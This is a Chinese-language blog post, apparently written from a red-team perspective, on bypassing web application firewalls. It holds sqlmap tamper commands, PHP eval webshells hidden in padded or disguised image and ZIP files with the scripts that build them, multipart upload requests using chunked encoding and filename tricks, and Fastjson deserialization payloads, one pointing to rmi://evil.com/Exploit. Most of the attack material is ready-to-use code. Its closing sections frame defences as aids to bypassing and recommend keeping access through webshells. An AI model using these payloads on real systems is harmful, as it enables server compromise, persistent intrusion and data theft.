+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空格替换为注释</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/api?id=1&quot;</span> --tamper=space2comment</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机大小写</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/api?id=1&quot;</span> --tamper=randomcase</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多重 tamper 组合</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/api?id=1&quot;</span> --tamper=space2comment,between,randomcase</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="文件上传-WAF-绕过"><a href="#文件上传-WAF-绕过" class="headerlink" title="文件上传 WAF 绕过"></a>文件上传 WAF 绕过</h1><h2 id="方法一：资源过载绕过-1"><a href="#方法一：资源过载绕过-1" class="headerlink" title="方法一：资源过载绕过"></a>方法一：资源过载绕过</h2><h3 id="超大文件上传"><a href="#超大文件上传" class="headerlink" title="超大文件上传"></a>超大文件上传</h3><p>通过上传超大文件（如 100MB+）并在文件末尾嵌入 Webshell，绕过 WAF 的内容检测。</p>
+<p><strong>构造恶意文件</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 100MB 垃圾数据 + Webshell</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=1M count=100 &gt; large.jpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt;&gt; large.jpg</span><br></pre></td></tr></table></figure>
+
+<p><strong>上传请求</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>104857600</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;avatar.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">[<span class="number">100</span>MB 垃圾数据]</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/6.webp" loading='lazy'></p>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li>文件扩展名伪装成图片（.jpg、.png、.gif）</li>
+<li>Content-Type 设置为 <code>image/jpeg</code></li>
+<li>Webshell 代码放在文件末尾，避免破坏文件头特征</li>
+<li>配合文件包含漏洞（如 <code>include($_GET[&#39;file&#39;])</code>）执行</li>
+</ul>
+<hr>
+<h2 id="方法二：协议层绕过-1"><a href="#方法二：协议层绕过-1" class="headerlink" title="方法二：协议层绕过"></a>方法二：协议层绕过</h2><h3 id="分块传输上传"><a href="#分块传输上传" class="headerlink" title="分块传输上传"></a>分块传输上传</h3><p>利用分块传输编码绕过 WAF 对文件内容的检测。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="number">12</span>c</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="number">2</span>a</span></span><br><span class="line"><span class="language-php"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"><span class="number">1</span>e</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary--</span></span><br><span class="line"><span class="language-php"><span class="number">0</span></span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/7.webp" loading='lazy'></p>
+<p><strong>进阶技巧</strong>：</p>
+<p><strong>1. 文件名混淆</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;shell.php%00.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>部分服务器会截断 <code>%00</code> 后的内容，实际保存为 <code>shell.php</code>。</p>
+<p><strong>2. MIME 类型伪造</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>base64</span><br><span class="line"></span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p>Base64 编码的 Webshell，部分 WAF 不会解码检测。</p>
+<p><strong>3. 双文件名绕过</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;normal.jpg&quot;; filename*=UTF-8&#x27;&#x27;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>利用 RFC 2231 标准，部分服务器优先解析 <code>filename*</code>。</p>
+<hr>
+<h2 id="方法三：文件格式特性绕过"><a href="#方法三：文件格式特性绕过" class="headerlink" title="方法三：文件格式特性绕过"></a>方法三：文件格式特性绕过</h2><h3 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h3><p><strong>1. GIF 图片马</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 GIF 文件头后插入 PHP 代码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GIF89a&quot;</span> &gt; shell.gif</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt;&gt; shell.gif</span><br><span class="line"><span class="built_in">cat</span> normal.gif &gt;&gt; shell.gif</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. PNG 图片马（IDAT 块注入）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建正常 PNG</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">100</span>, <span class="number">100</span>), color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;shell.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 IDAT 块中注入 PHP 代码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shell.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 IDAT 块并注入代码</span></span><br><span class="line">payload = <span class="string">b&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span></span><br><span class="line">modified = data.replace(<span class="string">b&#x27;IDAT&#x27;</span>, <span class="string">b&#x27;IDAT&#x27;</span> + payload, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shell_injected.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(modified)</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. ZIP 压缩包上传</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建包含 Webshell 的 ZIP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line">zip shell.zip shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改扩展名为图片</span></span><br><span class="line"><span class="built_in">mv</span> shell.zip shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>配合解压漏洞（如 <code>ZipArchive::extractTo()</code>）执行。</p>
+<hr>
+<h1 id="Fastjson-反序列化-WAF-绕过"><a href="#Fastjson-反序列化-WAF-绕过" class="headerlink" title="Fastjson 反序列化 WAF 绕过"></a>Fastjson 反序列化 WAF 绕过</h1><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>Fastjson 反序列化漏洞的核心是通过 <code>@type</code> 字段指定恶意类，触发 RCE。WAF 通常会检测 <code>@type</code> 关键字和已知恶意类名。</p>
+<h2 id="方法一：资源过载绕过-2"><a href="#方法一：资源过载绕过-2" class="headerlink" title="方法一：资源过载绕过"></a>方法一：资源过载绕过</h2><h3 id="超大-JSON-数据包"><a href="#超大-JSON-数据包" class="headerlink" title="超大 JSON 数据包"></a>超大 JSON 数据包</h3><p>在 JSON 中嵌入大量垃圾数据，将恶意载荷隐藏在深层嵌套中。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;profile&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;preferences&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zh-CN&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;notifications&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;sms&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;push&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;frequency&quot;</span><span class="punctuation">:</span> <span class="string">&quot;daily&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;malicious&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/web1/8.webp" loading='lazy'></p>
+<hr>
+<h2 id="方法二：JSON-语法特性绕过"><a href="#方法二：JSON-语法特性绕过" class="headerlink" title="方法二：JSON 语法特性绕过"></a>方法二：JSON 语法特性绕过</h2><h3 id="1-键值对顺序混淆"><a href="#1-键值对顺序混淆" class="headerlink" title="1. 键值对顺序混淆"></a>1. 键值对顺序混淆</h3><p>利用 JSON 对象的无序特性，将恶意键值对放在非预期位置。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong>：部分 WAF 只检测标准 JSON 格式，对非标准格式（如对象作为键）检测不足。</p>
+<hr>
+<h3 id="2-Unicode-编码绕过"><a href="#2-Unicode-编码绕过" class="headerlink" title="2. Unicode 编码绕过"></a>2. Unicode 编码绕过</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>\u0040\u0074\u0079\u0070\u0065</code> 解码后为 <code>@type</code>。</p>
+<hr>
+<h3 id="3-注释混淆"><a href="#3-注释混淆" class="headerlink" title="3. 注释混淆"></a>3. 注释混淆</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">/*comment*/</span> <span class="string">&quot;@type&quot;</span> <span class="comment">/*comment*/</span><span class="punctuation">:</span> <span class="comment">/*comment*/</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span> <span class="comment">/*comment*/</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>部分 JSON 解析器支持注释，但 WAF 可能不处理。</p>
+<hr>
+<h3 id="4-类名混淆"><a href="#4-类名混淆" class="headerlink" title="4. 类名混淆"></a>4. 类名混淆</h3><p><strong>利用 Fastjson 的类名解析特性</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lorg.apache.tomcat.dbcp.dbcp.BasicDataSource;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在类名前加 <code>L</code>，后加 <code>;</code>，Fastjson 仍可识别，但 WAF 可能无法匹配。</p>
+<hr>
+<h3 id="5-嵌套数组绕过"><a href="#5-嵌套数组绕过" class="headerlink" title="5. 嵌套数组绕过"></a>5. 嵌套数组绕过</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用 <code>java.lang.Class</code> 加载恶意类，绕过直接类名检测。</p>
+<hr>
+<h2 id="方法三：利用-Fastjson-版本特性"><a href="#方法三：利用-Fastjson-版本特性" class="headerlink" title="方法三：利用 Fastjson 版本特性"></a>方法三：利用 Fastjson 版本特性</h2><h3 id="AutoType-绕过（Fastjson-1-2-47）"><a href="#AutoType-绕过（Fastjson-1-2-47）" class="headerlink" title="AutoType 绕过（Fastjson 1.2.47）"></a>AutoType 绕过（Fastjson 1.2.47）</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>双 <code>@type</code> 绕过 AutoType 黑名单检测。</p>
+<hr>
+<h3 id="利用缓存机制（Fastjson-1-2-68）"><a href="#利用缓存机制（Fastjson-1-2-68）" class="headerlink" title="利用缓存机制（Fastjson 1.2.68）"></a>利用缓存机制（Fastjson 1.2.68）</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.ConfigurationMap&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;configuration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://evil.com/Exploit&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="WAF-绕过通用策略"><a href="#WAF-绕过通用策略" class="headerlink" title="WAF 绕过通用策略"></a>WAF 绕过通用策略</h1><h2 id="1-协议层攻击"><a href="#1-协议层攻击" class="headerlink" title="1. 协议层攻击"></a>1. 协议层攻击</h2><ul>
+<li><strong>HTTP 请求走私</strong>：利用 Content-Length 与 Transfer-Encoding 冲突</li>
+<li><strong>HTTP&#x2F;2 降级攻击</strong>：强制使用 HTTP&#x2F;1.1 绕过 HTTP&#x2F;2 专用 WAF</li>
+<li><strong>WebSocket 隧道</strong>：通过 WebSocket 传输恶意载荷</li>
+</ul>
+<h2 id="2-编码与混淆"><a href="#2-编码与混淆" class="headerlink" title="2. 编码与混淆"></a>2. 编码与混淆</h2><ul>
+<li><strong>多重编码</strong>：URL 编码 + Base64 + Unicode</li>
+<li><strong>字符集转换</strong>：UTF-7、UTF-16、GBK 等</li>
+<li><strong>大小写混淆</strong>：随机大小写组合</li>
+</ul>
+<h2 id="3-时间与资源"><a href="#3-时间与资源" class="headerlink" title="3. 时间与资源"></a>3. 时间与资源</h2><ul>
+<li><strong>慢速攻击</strong>：分多次请求发送载荷，绕过单次检测</li>
+<li><strong>并发攻击</strong>：大量并发请求过载 WAF</li>
+<li><strong>定时攻击</strong>：在 WAF 规则更新窗口期攻击</li>
+</ul>
+<h2 id="4-业务逻辑"><a href="#4-业务逻辑" class="headerlink" title="4. 业务逻辑"></a>4. 业务逻辑</h2><ul>
+<li><strong>参数污染</strong>：利用参数解析差异（如 <code>id=1&amp;id=2</code>）</li>
+<li><strong>路径穿越</strong>：利用路径解析差异（如 <code>/api/../admin</code>）</li>
+<li><strong>域名欺骗</strong>：利用 Host 头伪造</li>
+</ul>
+<hr>
+<h1 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h1><p>作为红队工程师，了解防御措施有助于更好地绕过：</p>
+<ol>
+<li><strong>深度包检测（DPI）</strong>：WAF 应完整解析协议，不依赖采样</li>
+<li><strong>语义分析</strong>：基于 AST 的 SQL&#x2F;代码分析，而非简单正则匹配</li>
+<li><strong>行为分析</strong>：结合用户行为、请求频率等多维度检测</li>
+<li><strong>动态规则更新</strong>：实时更新攻击特征库</li>
+<li><strong>多层防御</strong>：WAF + IDS + RASP 组合防护</li>
+</ol>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>WAF 绕过的核心是理解 WAF 与后端服务器的差异，通过协议、资源、特性三个维度寻找突破口。实战中应：</p>
+<ol>
+<li><strong>侦察阶段</strong>：识别 WAF 类型和版本（通过响应头、错误页面等）</li>
+<li><strong>测试阶段</strong>：使用自动化工具进行 Fuzz，寻找规则盲点</li>
+<li><strong>利用阶段</strong>：组合多种绕过技术，提高成功率</li>
+<li><strong>持久化阶段</strong>：上传 Webshell 后，使用加密通信、内存马等技术维持访问</li>
+</ol>
+<p>记住：WAF 绕过是一个持续对抗的过程，需要不断学习新技术、新漏洞，保持对安全产品的敏感度。</p>
